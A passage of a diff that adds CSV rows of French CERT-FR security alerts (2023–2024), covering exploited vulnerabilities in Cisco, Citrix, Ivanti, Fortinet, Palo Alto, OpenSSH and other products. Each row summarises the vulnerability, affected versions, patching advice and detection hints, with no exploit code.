+    fournies par l'utilisateur permet à un attaquant distant de tenter
+    une exécution de code arbitraire.
+
+Cependant, à la date de publication initiale de cette alerte, l'éditeur
+ne propose pas de correctif",2023-10-02T02:00:00.000000,Exim N/A – Exim versions antérieures à 4.96.1 ou 4.97
+CERTFR-2023-ALE-011,[MàJ] Multiples vulnérabilités dans Cisco IOS XE,2024-02-16,CVE-2023-20198; CVE-2023-20273,Exécution de code arbitraire à distance; Élévation de privilèges; Contournement de la politique de sécurité,"\[Mise à jour du 02 novembre
+2023\]
+
+La version 17.3.8a est disponible.
+
+\[Mise à jour du 31 octobre 2023\]
+
+Les détails techniques de la vulnérabilité CVE202320198 sont désormais
+disponibles publiquement. Cette vulnérabilité était déjà massivement
+exploitée. Tous les équipements exposant l'interface de gestion Web
+d'IOS XE doivent être considérés comme compromis.
+
+\[Mise à jour du 30 octobre 2023\]
+
+Les versions 17.6.6a et 16.12.10a sont disponibles.
+
+\[Mise à jour du 23 octobre 2023\]
+
+Le 22 octobre 2023, Cisco a mis à jour son avis de sécurité pour ajouter
+la vulnérabilité CVE202320273. Celleci est activement exploitée par
+les attaquants pour élever leurs privilèges à root après avoir créé un
+utilisateur de niveau 15. Cela leur permet de placer un implant sur le
+système de fichiers de l'équipement.
+
+La version 17.9.4a corrige ces vulnérabilités pour la branche 17.9.x. La
+date de disponibilité des autres correctifs n'a pas été annoncée.
+
+\[Publication initiale\]
+
+Le 16 octobre 2023, Cisco a publié un avis de sécurité concernant la
+vulnérabilité CVE202320198 affectant l'interface Web de gestion d'IOS
+XE (webui). Cette vulnérabilité permet à un attaquant non authentifié
+de créer un [utilisateur disposant des privilèges de niveau
+15](https://learningnetwork.cisco.com/s/blogs/a0D3i000002eeWTEAY/ciscoiosprivilegelevels).
+Cela donne accès à toutes les commandes et la possibilité de modifier la
+configuration de l'équipement vulnérable, ce qui revient à en prendre le
+contrôle compl",2023-10-17T02:00:00.000000,Cisco IOS XE – IOS XE versions 17.6.x antérieures à 17.6.6a | Cisco IOS XE – Cisco IOS XE si l'interface Web de gestion est accessible | Cisco IOS XE – IOS XE sur Catalyst 3650 et 3850 versions 16.12.x antérieures à 16.12.10a | Cisco IOS XE – IOS XE versions 17.3.x antérieures à 17.3.8a | Cisco IOS XE – IOS XE versions 17.9.x antérieures à 17.9.4a
+CERTFR-2023-ALE-012,[MàJ] Vulnérabilité dans Citrix NetScaler ADC et NetScaler Gateway,2024-02-16,CVE-2023-4966,Atteinte à la confidentialité des données; Exécution de code arbitraire à distance,"\[Mise à jour du 22 novembre
+2023\]
+
+L'éditeur a publié un document \[3\] le 20 novembre 2023 listant les
+différents journaux à analyser ainsi que les éléments à rechercher pour
+identifier une activité pouvant être liée à une compromission.
+
+Par ailleurs, la CISA a publié un avis de sécurité le 21 novembre 2023
+\[4\] indiquant que, comme anticipé le 24 octobre, des campagnes d'exploitation
+massives sont en cours notamment pour le déploiement de rançongiciels.
+
+Le CERTFR rappelle que tout équipement
+qui n'aurait pas été mis à jour doit être considéré comme compromis. Il
+est impératif de réaliser des investigations sans délai \[5\] en
+s'appuyant sur l'ensemble des recommandations fournies dans les
+différentes publications \[2\]\[3\]\[4\].
+
+ 
+
+\[Mise à jour du 24 octobre 2023\]
+Des chercheurs ont publiés des détails techniques sur la
+vulnérabilité ce jour. Le
+CERTFR anticipe l'apparition de codes d'exploitation publics suivie
+d'une augmentation des tentatives d'exploitation de cette
+vulnérabilité.
+
+\[Publication initiale\]
+
+Le 10 octobre 2023, Citrix a publié un avis de sécurité \[1\] concernant
+la vulnérabilité CVE20234966 affectant NetScaler ADC et NetScaler
+Gateway. L'éditeur lui a donné un score de 9,4 et indiqué qu'elle permet
+une atteinte à la confidentialité des données.
+
+Le 17 octobre 2023, Citrix a mis son avis à jour pour déclarer avoir
+connaissance d'exploitations actives de la vulnérabilité CVE20234966.
+
+Le même jour, Mandiant a publié un billet de blogue \[2\] dans ",2023-10-23T02:00:00.000000,
+CERTFR-2023-ALE-013,Vulnérabilité dans Apache Struts 2,2024-02-16,CVE-2023-50164,Exécution de code arbitraire à distance,"Le 4 décembre 2023, Apache a publié un avis de sécurité
+concernant la vulnérabilité critique CVE202350164 concernant le cadriciel Struts 2. Cette vulnérabilité
+permet à un attaquant non authentifié de téléverser une porte dérobée
+sur un serveur vulnérable, et ainsi exécuter du code arbitraire à
+distance.
+
+Le 12 décembre 2023, un premier code d'exploitation a été
+publié publiquement et le CERTFR a connaissance de tentatives
+d'exploitation.
+
+Il est urgent d'effectuer la mise à jour des applications
+s'appuyant sur le cadriciel Struts dans les plus brefs délais, car le
+CERTFR anticipe des tentatives d'exploitation en
+masse de la vulnérabilité CVE202350164.",2023-12-13T01:00:00.000000,Apache Struts – Struts versions 2.x antérieures à 2.5.33 | Apache Struts – Struts versions 6.x antérieures à 6.3.0.2
+CERTFR-2023-ALE-015,[MàJ] Campagne d'exploitation d'une vulnérabilité affectant VMware ESXi,2023-03-14,CVE-2021-21974; CVE-2020-3992,Exécution de code arbitraire à distance,"\[Mise à jour du 10 février
+2023\]  
+Une nouvelle vague d’attaque démarrée le 8 février change la méthode de
+chiffrement permettant de chiffrer un plus grand volume de données dans
+les fichiers de grande taille rendant la restauration des données plus
+difficile voire impossible.
+
+\[Mise à jour du 05 février 2023\] Mise à jour du résumé et de la
+section 'Solution'.
+
+Le 03 février 2023, le CERTFR a pris connaissance de campagnes
+d'attaque ciblant les hyperviseurs VMware ESXi dans le but d'y déployer
+un rançongiciel.
+
+Dans l'état actuel des
+investigations, ces campagnes d'attaque semblent avoir tiré parti
+de l'exposition d'hyperviseurs ESXi qui n'auraient pas été mis à jour
+des correctifs de sécurité suffisamment rapidement. En particulier, le
+service SLP semble avoir été visé, service pour lequel plusieurs
+vulnérabilités avaient fait l'objet de correctifs successifs (notamment
+les vulnérabilités CVE20203992 et CVE202121974, cf. section
+Documentation). Ces vulnérabilités permettent à un attaquant de réaliser
+une exploitation de code arbitraire à distance. Des codes d'exploitation
+sont disponibles en source ouverte depuis au moins mai 2021.
+
+Les systèmes actuellement visés seraient des hyperviseurs ESXi en
+version 6.x et antérieures à 6.7.
+
+Cependant, le CERTFR rappelle que les vulnérabilités affectant SLP
+concernent les systèmes suivants :
+
+   ESXi versions 7.x antérieures à ESXi70U1c17325551
+   ESXi versions 6.7.x antérieures à ESXi670202102401SG
+   ESXi versions 6.5.x antérieu",2023-02-03T18:00:00.000000,
+CERTFR-2024-ALE-001,[MàJ] Multiples vulnérabilités dans Ivanti Connect Secure et Policy Secure Gateways,2024-04-15,CVE-2023-46805; CVE-2024-21887; CVE-2024-21893; CVE-2024-21888; CVE-2024-22024,Exécution de code arbitraire à distance; Élévation de privilèges; Contournement de la politique de sécurité,"[Mise à jour du 4 mars 2024] Ivanti a publié le 29 février des recommandations de résolution pour les Ivanti Connect Secure ou Policy Secure en machine virtuelle [16].  [Mise à jour du 15 février 2024] l'éditeur a publié le 15 février des correctifs pour les versions suivantes, qui n'en disposaient pas encore jusquelà :   Ivanti Connect Secure versions 9.1R15.3, 9.1R16.3, 22.1R6.1, 22.2R4.1, 22.3R1.1 et 22.4R1.1 Ivanti Policy Secure versions 9.1R16.3, 22.4R1.1 et 22.6R1.1  [Mise à jour du 09 février 2024] Ajout de la vulnérabilité CVE202422024  La publication des premières vulnérabilités a fait suite à la découverte par l'éditeur de leur exploitation ciblée, probablement depuis 2023. L'exploitation de ces vulnérabilités aurait permis aux attaquants de se latéraliser et de récupérer des identifiants sur les équipements Ivanti compromis. Ensuite, des codes d'exploitation, puis de nouvelles vulnérabilités, ont été publiés mijanvier. L'ensemble de ces vulnérabilités est exploité massivement. Le 08 février 2024, Ivanti a publié un bulletin de sécurité concernant la vulnérabilité CVE202422024, affectant les produits Ivanti Connect Secure, Ivanti Policy Secure et ZTA gateways. Le détail des versions vulnérables est disponible dans la section solution. Elle permet à un attaquant non authentifié d'accéder à des ressources restreintes. Les chercheurs ayant découvert cette vulnérabilité ont publié une preuve de concept.  [Mise à jour du 04 février 2024] Ajout de recommandations pour une",2024-01-11T01:00:00.000000,"Ivanti N/A – Ivanti Connect Secure (ICS, anciennement Pulse Connect Secure) toutes versions | Ivanti N/A – Ivanti Neurons pour passerelles ZTA, toutes versions, en cours d'installation et non connecté à un contrôleur ZTA | Ivanti N/A – Ivanti Policy Secure gateways (IPS) toutes versions"
+CERTFR-2024-ALE-002,[MàJ] Multiples Vulnérabilités dans GitLab,2024-02-22,CVE-2024-0402; CVE-2023-7028,Contournement de la politique de sécurité; Exécution de code arbitraire à distance,"\[Mise à jour du 29 janvier 2024\]
+
+
+Le 25 janvier 2024, l'éditeur a publié un avis de sécurité concernant
+plusieurs vulnérabilités affectant GitLab CE et EE.
+
+La vulnérabilité CVE20240402 est considérée critique avec un score
+CVSSv3 de 9,9. Elle permet à un attaquant authentifié d'écrire des
+fichiers à un emplacement arbitraire.
+
+\[Publication initiale\]
+
+Le 11 janvier 2024, l'éditeur a publié un avis de sécurité concernant
+plusieurs vulnérabilités affectant GitLab CE et EE.
+
+La plus critique est la vulnérabilité CVE20237028. Elle permet à un
+attaquant non authentifié d'envoyer un courriel de réinitialisation de
+mot de passe de n'importe quel utilisateur à une adresse arbitraire.
+L'attaquant peut ainsi, par le biais d'une simple requête HTTP POST,
+prendre le contrôle d'un compte dont il connaitrait le courriel.
+
+Le score CVSSv3 de la vulnérabilité CVE20237028 est de 10 (sur 10).
+Son exploitation est triviale et le CERTFR anticipe la publication de
+codes d'exploitations publics dans les heures à venir.
+
+L'éditeur recommande de vérifier:
+
+   dans le journal d'activité ""gitlabrails/productionjson.log"", la
+    présence de requêtes HTTP, sur le chemin ""/users/password"",
+    contenant plusieurs adresses courriel;
+   dans le journal d'activité ""gitlabrails/auditjson.log"", la
+    présence d'identifiants correspondant à ""PasswordsControllercreate""
+    avec des ""targetdetails"" composé d'un tableau comprenant plusieurs
+    adresses courriel.
+
+Le CERTFR recommande donc d'appliquer les c",2024-01-12T01:00:00.000000,
+CERTFR-2024-ALE-003,[MàJ] Incident affectant les solutions AnyDesk,2024-04-15,Aucune,Prise de contrôle à distance par un acteur malveillant; Atteinte à la confidentialité des données,"\[Mise à jour du 27 février 2024\]
+
+
+Le 29 janvier 2024 l'ANSSI a été alertée par le BSI que l'éditeur
+AnyDesk Software GmbH a été victime d'une fuite de données. Le code
+source des applications développées par l'éditeur ainsi que des
+certificats et clés privées pourraient avoir été dérobés. De plus, l’éditeur indique que deux de ses
+serveurs relais situés en Europe ont également été affectés par cet
+incident.
+
+L'éditeur est spécialisé dans le développement de solutions logicielles
+de bureau à distance utilisables pour l'assistance à distance des
+utilisateurs, l'administration de serveurs, le télétravail ou encore le
+rebond vers des ressources internes d'entreprise non accessibles
+publiquement. Les solutions AnyDesk couvrent un large spectre de
+systèmes d'exploitation : Linux, Windows, MacOS, Android, iOS, AppleTV,
+etc.
+
+Selon l'entreprise, les données exfiltrées pourraient potentiellement
+être réutilisées dans le cadre d'attaques ultérieures visant les
+utilisateurs des solutions AnyDesk. Selon l'éditeur ces attaques sont
+susceptibles de :
+
+   Viser à affaiblir la sécurité de l'infrastructure de communication
+    entre utilisateurs AnyDesk, par exemple au travers d'attaques de
+    type homme du milieu/attaque de l'intercepteur (Meddler in the
+    Middle/Man in the Middle) ;
+   Viser à altérer les logiciels publiés par l'entreprise ou identifiés
+    comme produits par l'entreprise.
+
+Le CERTFR ne peut pas confirmer, à ce stade, la vraisemblance ou la
+complexité de mise en œuvre",2024-02-05T01:00:00.000000,
+CERTFR-2024-ALE-004,[MàJ] Vulnérabilité dans Fortinet FortiOS,2024-07-01,CVE-2024-21762,Exécution de code arbitraire à distance,"\[Mise à jour du 19 mars 2024\] Le CERTFR a
+connaissance de codes d'exploitation publics et de nouvelles tentatives
+d'exploitation.  
+
+
+Le 8 février 2024, Fortinet a publié l'avis de sécurité
+concernant la vulnérabilité critique CVE202421762 affectant le VPN SSL
+de FortiOS. Cette vulnérabilité permet à un
+attaquant non authentifié de provoquer une exécution de code arbitraire
+à distance.  
+
+
+\[Mise à jour
+du 15 février 2024\] Une mise à jour du bulletin éditeur du 8 février
+indique que FortiProxy est aussi affecté par cette vulnérabilité.
+
+La CISA a connaissance d’exploitation de cette
+vulnérabilité par des attaquants \[1\]. Le CERTFR recommande
+donc fortement d'appliquer le correctif dans les plus brefs
+délais.",2024-02-09T01:00:00.000000,Fortinet N/A – FortiProxy 1.1 toutes versions | Fortinet N/A – FortiOS versions 7.4.x antérieures à 7.4.3 | Fortinet N/A – FortiProxy versions 7.2.x antérieures à 7.2.9 | Fortinet N/A – FortiOS versions 6.4.x antérieures à 6.4.15 | Fortinet N/A – FortiProxy versions 2.0.x antérieures à 2.0.14 | Fortinet N/A – FortiProxy 1.0 toutes versions | Fortinet N/A – FortiOS versions 6.2.x antérieures à 6.2.16 | Fortinet N/A – FortiProxy versions 7.4.x antérieures à 7.4.3 | Fortinet N/A – FortiProxy versions 7.0.x antérieures à 7.0.15 | Fortinet N/A – FortiProxy 1.2 toutes versions | Fortinet N/A – FortiOS versions 7.0.x antérieures à 7.0.14 | Fortinet N/A – FortiOS versions 7.2.x antérieures à 7.2.7 | Fortinet N/A – FortiOS 6.0 toutes versions
+CERTFR-2024-ALE-005,[MàJ] Vulnérabilité dans Microsoft Outlook,2024-04-15,CVE-2024-21413,Atteinte à la confidentialité des données; Exécution de code arbitraire à distance,"\[Mise à jour du 15 mars 2024\] Ajout de
+précision concernant les défiréponses NTLM
+
+\[Mise à jour du 22 février 2024\] Ajout de
+recommandations et de précisions sur le fonctionnement de la
+vulnérabilité.
+
+La vulnérabilité CVE202421413 permet à un attaquant de contourner les
+mesures de sécurité de la suite Office, dont la solution de messagerie
+Outlook. Plus précisément, son exploitation permet de contourner
+certaines mesures de sécurité de la suite Office qui empêchent l'accès à
+une ressource externe sans validation de l'utilisateur.
+
+Ainsi, en utilisant un lien malveillant dans un courriel, un attaquant
+est en mesure :
+
+   d'obtenir la réponse à un défiréponse lié à l'authentification de
+    l'utilisateur, par exemple via le protocole SMB. Ce défiréponse
+    dépend de la configuration système et est communément au format
+    NTLMv2. Ce comportement combiné à une attaque de type ""relais NTLM""
+    permettrait à un attaque de réaliser une coercition
+    d'authentification.
+   si la cible du lien est un document Office, de provoquer l'ouverture
+    du document sans que le mode protégé de Microsoft Office ne soit
+    activé, permettant in fine une exécution de code arbitraire à
+    distance.
+
+\[Publication initiale\]
+
+Le 13 février 2024, Microsoft a publié un correctif pour la
+vulnérabilité CVE202421413 affectant le
+produit Outlook pour Windows.  
+Elle permet à un attaquant non authentifié de divulguer le condensat
+NTLM (new technology LAN manager) local et potentiellement
+une e",2024-02-15T01:00:00.000000,Microsoft Office – Microsoft Office LTSC 2021 | Microsoft Office – Microsoft Office 2019 | Microsoft Office – Microsoft Office 2016 | Microsoft N/A – Microsoft 365 Apps
+CERTFR-2024-ALE-006,[MàJ] Vulnérabilité dans Palo Alto Networks GlobalProtect,2024-07-01,CVE-2024-3400,Exécution de code arbitraire à distance,"\[Mise à jour du 10 mai 2024\]
+Le CERTFR est intervenu pour le traitement d'une compromission
+par rançongiciel au sein d'une entité française. Dans le cadre de cette
+attaque, la vulnérabilité a été exploitée pour ensuite réaliser une
+latéralisation dans le système d'information de la victime et déployer
+le rançongiciel.
+
+Par ailleurs, l'éditeur recommande l'ouverture d'un dossier de support
+et l'exécution d'une version
+améliorée de la remise en état d'usine (enhanced factory reset)
+\[6\] dans le cas où un équipement n'aurait pas été mis à jour avant le
+25 avril 2024 ou si l'éventualité d'une compromission persistante ne
+peut pas être écartée après investigation.
+
+ 
+
+\[Mise à jour du 26 avril 2024\]
+
+
+Note importante : Si un
+équipement a déjà été compromis, l'application du correctif de sécurité
+ne suffit pas. Si des investigations n'ont pas été réalisées, elles doivent être faites
+pour s'assurer que l'équipement n'a pas été compromis avant sa mise à
+jour. En effet, dans ce cas, une remise en état d'usine sera requis.
+
+\[Mise à
+jour du 25 avril 2024\] 
+
+Le CERTFR a pris connaissance de cas
+d'exploitation de cette vulnérabilité par des acteurs
+rançongiciels.
+
+Par ailleurs, les mesures de remédiation
+ont fait l'objet d'une clarification : la remise en état d'usine
+(factory reset) est fortement recommandée dans tous les cas, sauf
+contreordre explicite de l’éditeur.
+
+ 
+
+\[Mise à
+jour du 19 avril 2024\] Ajout de mesures de remédiation  
+
+
+ Détection de la compromission
+
+Il est reco",2024-04-12T02:00:00.000000,"Palo Alto Networks N/A – PAN-OS 10.2.x antérieures à 10.2.0-h3, 10.2.1-h2, 10.2.2-h5, 10.2.3-h13, 10.2.4-h16, 10.2.5-h6, 10.2.6-h3, 10.2.7-h8, 10.2.8-h3 et 10.2.9-h1 | Palo Alto Networks N/A – PAN-OS 11.0.x versions antérieures à 11.0.0-h3, 11.0.1-h4, 11.0.2-h4, 11.0.3-h10 et 11.0.4-h1 | Palo Alto Networks N/A – PAN-OS 11.1.x versions antérieures à 11.1.0-h3, 11.1.1-h1 et 11.1.2-h3"
+CERTFR-2024-ALE-007,Multiples vulnérabilités dans les produits Cisco,2024-07-01,CVE-2024-20353; CVE-2024-20359,Exécution de code arbitraire; Déni de service à distance,"Le 24 avril 2024, Cisco a publié trois avis de sécurité concernant des
+vulnérabilités affectant les équipements de sécurité ASA et FTD.
+
+Deux d'entre eux concernent les vulnérabilités CVE202420353 et
+CVE202420359 qui sont activement exploitées dans le cadre d'attaques
+ciblées.
+
+La vulnérabilité CVE202420359 permet à un utilisateur authentifié avec
+des droits administrateur d'exécuter du code arbitraire avec les
+privilèges root.
+
+En effet, si l'attaquant parvient à écrire un fichier malveillant sur le
+système de fichier du disk0:, cela lui permet d'exécuter son code au
+prochain redémarrage de l'équipement. Cisco indique que l'attaquant peut
+exploiter la vulnérabilité CVE202420353 pour déclencher son
+redémarrage.
+
+Dans son billet de blogue \[1\], Cisco Talos détaille l'historique des
+exploitations et indique que les premières infections constatées
+remontent à début janvier 2024.
+
+L'éditeur indique ne pas avoir connaissance du vecteur initial
+d'infection. Toutefois une fois sur l'équipement, l'attaquant exploite
+ces deux vulnérabilités pour mettre en place un implant, nommé Line
+Runner par Talos, qui est une porte dérobée persistante.
+
+La présence d'un autre implant, Line Dancer, a été constaté sur des
+équipements compromis.
+
+Celuici est présent uniquement en mémoire et permet à l'attaquant :
+
+   de désactiver les journaux d'activité système ;
+   de récupérer des élements de configuration ;
+   d'effectuer et d'exfiltrer des captures réseaux ;
+   d'exécuter des commandes arbitrai",2024-04-25T02:00:00.000000,"Cisco N/A – Cisco Firepower Threat Defense (FTD) sans les derniers correctifs de sécurité, se référerer au bulletin de sécurité de l'éditeur pour les versions vulnérables (cf. section Documentation) | Cisco N/A – Cisco Adaptive Security Appliance (ASA) sans les derniers correctifs de sécurité, se référerer au bulletin de sécurité de l'éditeur pour les versions vulnérables (cf. section Documentation)"
+CERTFR-2024-ALE-008,[MàJ] Vulnérabilité dans les produits Check Point ,2024-07-01,CVE-2024-24919,Atteinte à la confidentialité des données,"[Mise à jour du 31 mai 2024]
+
+Des preuves de concept sont désormais disponibles publiquement sur Internet.
+
+De plus, l'éditeur indique avoir détecté des tentatives de compromission à partir du 7 avril 2024.  
+
+
+[Publication Initiale]
+
+Une vulnérabilité a été découverte dans les produits Check Point. Elle permet à un attaquant de provoquer une atteinte à la confidentialité des données. 
+
+L'éditeur indique avoir connaissance de tentatives d'exploitation depuis le 30 avril 2024.
+
+Le CERTFR a connaissance de l’exploitation de cette vulnérabilité et recommande donc fortement d'appliquer le correctif dans les plus brefs délais.
+
+L'éditeur indique qu'il est nécessaire de changer les mots de passe LDAP et de désactiver les comptes qui utilisent le mot de passe comme seule méthode d'authentification. Par mesure de précaution, le CERTFR recommande de changer l'ensemble des secrets pouvant se trouver sur l'équipement.
+
+ Étapes d'investigation
+
+En cas de suspicion ou de compromission avérée de l'équipement, l'éditeur préconise de rechercher dans les journaux d'authentification [1].",2024-05-30T09:07:27.409727,"Check Point N/A –  Quantum Spark Gateways versions R81.10.x, R80.20.x et R77.20.x sans le dernier correctif de sécurité | Check Point N/A – Quantum Maestro et Quantum Scalable Chassis versions R81.20, R81.10, R80.40, R80.30SP et R80.20SP sans le dernier correctif de sécurité | Check Point N/A – Quantum Security Gateway et CloudGuard Network Security versions R81.20, R81.10, R81 et R80.40 sans le dernier correctif de sécurité"
+CERTFR-2024-ALE-009,Vulnérabilité dans OpenSSH,2024-10-07,CVE-2024-6387,Exécution de code arbitraire à distance,"Le 1 juillet 2024, OpenSSH a publié un avis de sécurité concernant la vulnérabilité critique CVE20246387.
+
+Cette vulnérabilité permet à un attaquant non authentifié d'exécuter du code arbitraire à distance avec les privilèges root.
+
+L'éditeur précise que les versions 8.5p1 à 9.7p1 sont vulnérables, de manière confirmée, sur des systèmes Linux 32 bits avec la glibc et l'ASLR activé. Toutefois, il est précisé que l'exploitation nécessite entre six et huit heures de connexions continues. De plus, il spécule que ces attaques pourraient être optimisées pour être plus rapides, à plus forte raison lorsque l'ASLR est désactivé.
+
+L'éditeur ajoute que l'exploitation sur des systèmes 64 bits ou sans glibc semble possible mais n'a pas été démontrée.
+
+Cette vulnérabilité a été découverte par des chercheurs de Qualys. Dans leur billet de blogue (cf. section Documentation), ceuxci précisent que les versions antérieures à 4.4p1 d'OpenSSh sont également vulnérables. 
+De plus, ils conseillent de vérifier la présence de très nombreuses lignes ""Timeout before authentication"" dans les journaux pour détecter de potentielles tentatives d'exploitations.
+
+En date du 1 juillet 2024, certaines distributions Linux ont proposé des correctifs pour des versions vulnérables (cf. section Documentation).
+
+Dans l'attente de la disponibilité de correctifs, Qualys conseille de modifier la valeur de LoginGraceTime à 0 dans le fichier de configuration. Cette mesure de contournement permet d'empêcher une exécution ",2024-07-01T12:56:56.459929,OpenSSH N/A – OpenSSH versions 8.5p1 à 9.7p1 antérieures à 9.8 et 9.8p1
+CERTFR-2024-ALE-010,Multiples vulnérabilités dans Roundcube,2024-10-07,CVE-2024-42009; CVE-2024-42008; CVE-2024-42010,Injection de code indirecte à distance (XSS); Atteinte à la confidentialité des données,"Le 4 août 2024, Roundcube a publié des correctifs concernant les vulnérabilités critiques CVE202442008 et CVE202442009 affectant son serveur de courriel.
+
+Ces vulnérabilités permettent des injections de code indirectes à distance (XSS) qui peuvent, par exemple, conduire à la récupération du contenu des courriels de l'utilisateur. De plus, l’attaquant peut également être en mesure d’envoyer des courriels en se faisant passer pour la victime.
+
+La vulnérabilité CVE202442009 peut être exploitée par une simple ouverture du courriel piégé tandis que la vulnérabilité CVE202442008 nécessite que l’utilisateur effectue une action supplémentaire.
+
+Roundcube est un produit en source ouverte et les correctifs sont accessibles publiquement. Le CERTFR anticipe donc la publication à court terme de codes d’exploitation publics.
+Des vulnérabilités de ce type ont été activement exploitées sur des serveurs Roundcube Webmail par le passé.",2024-08-09T14:35:34.035200,Roundcube Roundcube Webmail – Roundcube Webmail versions 1.5.x antérieures à 1.5.8 | Roundcube Roundcube Webmail – Roundcube Webmail versions 1.6.x antérieures à 1.6.8
+CERTFR-2024-ALE-011,Vulnérabilité dans SonicWall,2024-11-21,CVE-2024-40766,Déni de service à distance; Contournement de la politique de sécurité; Atteinte à la confidentialité des données,"Le 22 août 2024, Sonicwall a publié un correctif concernant la vulnérabilité critique CVE202440766 affectant les parefeux Sonicwall génération 5, 6 et 7.
+Cette vulnérabilité, de type contrôle d'accès défaillant, permet à un attaquant de provoquer un déni de service à distance, une atteinte à la confidentialité des données et un contournement de la politique de sécurité.
+Le 6 septembre 2024, l'éditeur complète son avis en précisant que la fonctionnalité SSLVPN est également affectée. De plus, Sonicwall indique que la vulnérabilité CVE202440766 est potentiellement activement exploitée dans le cadre d'attaques ciblées.
+
+Le CERTFR recommande fortement de suivre les préconisations de l'éditeur :
+
+ mettre à jour les mots de passe des utilisateurs de SSLVPN qui ont des comptes gérés localement pour renforcer la sécurité et empêcher les accès non autorisés ;
+ activer l'authentification à plusieurs facteurs des utilisateurs de SSLVPN.",2024-09-10T12:22:00.000000,"Sonicwall SonicOS – Gen7 Firewalls - TZ270, TZ270W, TZ370, TZ370W, TZ470, TZ470W, TZ570, TZ570W, TZ570P, TZ670, NSa 2700, NSa 3700,NSa 4700, NSa 5700, NSa 6700, NSsp 10700, NSsp 11700, NSsp 13700 versions antérieures  ou égales à 7.0.1-5035 | Sonicwall SonicOS – SOHO (Gen 5) versions antérieures à 5.9.2.14-13o | Sonicwall SonicOS – Gen6 Firewalls - SOHOW, TZ 300, TZ 300W, TZ 400, TZ 400W, TZ 500, TZ 500W, TZ 600, NSA 2650,NSA 3600, NSA 3650, NSA 4600, NSA 4650, NSA 5600, NSA 5650, NSA 6600, NSA 6650, SM 9200, SM 9250, SM 9400, SM 9450, SM 9600, SM 9650, TZ 300P, TZ 600P, SOHO 250, SOHO 250W, TZ 350, TZ 350W versions antérieures à 6.5.2.8-2n pour SM9800, NSsp 12400, NSsp 12800 et versions antérieures à 6.5.4.15.116n pour les autres références"
+CERTFR-2024-ALE-012,[MàJ] Vulnérabilités affectant OpenPrinting CUPS,2024-11-21,CVE-2024-47076; CVE-2024-47177; CVE-2024-47176; CVE-2024-47175,Exécution de code arbitraire à distance; Contournement de la politique de sécurité; Atteinte à la confidentialité des données,"[Mise à jour du 10 octobre 2024]
+
+Le 28 septembre 2024, Elastic Security Labs a publié des règles de détection au format propriétaire de l'éditeur (cf. section Documentation), qui sont confirmées par les analyses du CERTFR pour la détection des attaques connues.
+
+[Publication initiale]
+
+De multiples vulnérabilités ont été découvertes dans OpenPrinting CUPS et dans le composant cupsbrowsed. Celuici permet notamment de découvrir automatiquement des imprimantes partagées sur le réseau. 
+
+
+
+Au total, quatre vulnérabilités ont été identifiées. Elles permettent : 
+
+ de récupérer des informations sur le système d'information de la victime;
+ d'ajouter automatiquement sur le système une nouvelle imprimante, voire de remplacer une imprimante existante;
+ d'exécuter du code arbitraire à distance, lorsque l'utilisateur lance une tâche d'impression sur l'imprimante ajoutée précédemment.
+
+
+ Le CERTFR a connaissance de codes d'exploitation publics mais pas encore de cas d'exploitation active.",2024-09-27T13:20:54.076234,OpenPrinting cups-browsed – OpenPrinting cups-browsed toutes versions | OpenPrinting libcupsfilters – OpenPrinting libcupsfilters toutes versions | OpenPrinting libppd – OpenPrinting libppd toutes versions | OpenPrinting cups-filter – OpenPrinting cups-filter toutes versions
+CERTFR-2024-ALE-014,[MàJ] Multiples vulnérabilités dans Fortinet FortiManager,,CVE-2024-50566; CVE-2024-47575,Exécution de code arbitraire à distance,"[Mise à jour du 14 janvier 2025] Publication des correctifs
+
+Le 14 janvier 2025, Fortinet a publié un avis de sécurité relatif à la vulnérabilité CVE202450566 qui correspond à la vulnérabilité de type jourzéro pour laquelle une preuve de concept a été publiée en novembre 2024. Des correctifs de sécurité sont désormais disponibles et doivent être appliqués.
+
+[Mise à jour du 15 novembre 2024] Le CERTFR a connaissance d'une vulnérabilité de type jourzéro non couverte par le correctif FGIR24423.
+
+Le 14 novembre 2024, le CERTFR a pris connaissance d'une preuve de concept publique permettant l'exploitation d'une vulnérabilité de type jourzéro affectant l'ensemble des équipements FortiManager et FortiAnalyzer avec la fonctionnalité FortiManager.
+
+
+Cette vulnérabilité permet à un attaquant contrôlant un équipement FortiGate enregistré de prendre le contrôle de l'équipement FortiManager associé, même sur les versions les plus à jour. Un attaquant peut donc, depuis un équipement FortiGate compromis, se latéraliser vers un équipement FortiManager puis vers d'autres équipements FortiGate même si ces derniers ne sont pas exposés sur Internet et qu'ils bénéficient des derniers correctifs de sécurité.
+
+
+[Publication initiale]
+
+Une vulnérabilité a été découverte dans Fortinet FortiManager. Elle permet à un attaquant non authentifié de provoquer une exécution de code arbitraire à distance.
+
+Fortinet indique que la vulnérabilité CVE202447575 est activement exploitée. L'éditeur précise qu'en ex",2024-10-30T13:00:00.000000,"Fortinet FortiManager – FortiManager versions 7.6.x antérieures à 7.6.2 | Fortinet FortiManager – FortiManager versions 7.2.x antérieures à 7.2.9 | Fortinet FortiAnalyzer – FortiAnalyzer modèles 1000E, 1000F, 2000E, 3000E, 3000F, 3000G, 3500E, 3500F, 3500G, 3700F, 3700G, 3900E avec la fonctionnalité FortiManager | Fortinet FortiManager – FortiManager versions 6.4.x antérieures à 6.4.15 | Fortinet FortiManager – FortiManager versions 7.0.x antérieures à 7.0.13 | Fortinet FortiManager – FortiManager Cloud versions 7.4.x antérieures à 7.4.5 | Fortinet FortiManager – FortiManager versions 6.2.x antérieures à 6.2.13 | Fortinet FortiManager – FortiManager Cloud versions 7.2.x antérieures à 7.2.8 | Fortinet FortiManager – FortiManager versions 7.4.x antérieures à 7.4.6 | Fortinet FortiManager – FortiManager Cloud versions 6.4.x à 7.0.x antérieures à 7.0.13"
+CERTFR-2024-ALE-015,[MàJ] Multiples vulnérabilités sur l'interface d'administration des équipements Palo Alto Networks,,CVE-2024-9474; CVE-2024-0012,Exécution de code arbitraire à distance,"Le 8 novembre 2024, Palo Alto Networks a publié un avis de sécurité relatif à une vulnérabilité critique dans certains parefeux Palo Alto Networks. Elle permet à un attaquant non authentifié d'exécuter du code arbitraire à distance sur l'interface d'administration des équipements.
+
+L'éditeur indique dans une mise à jour du 14 novembre 2024 avoir connaissance de l'exploitation de cette vulnérabilité sur des parefeux exposant leur interface d'administration sur Internet. 
+
+
+
+\[Mise à jour du 19 novembre 2024\] 
+
+
+
+Le 18 novembre 2024, l'éditeur a publié un avis de sécurité concernant la vulnérabilité CVE20249474. Celleci permet d'élever ses privilèges et peut être utilisée à la suite de la vulnérabilité publiée le 8 novembre 2024, ayant désormais l'identifiant CVE20240012, afin d'obtenir les droits les plus élevés sur l'équipement.
+
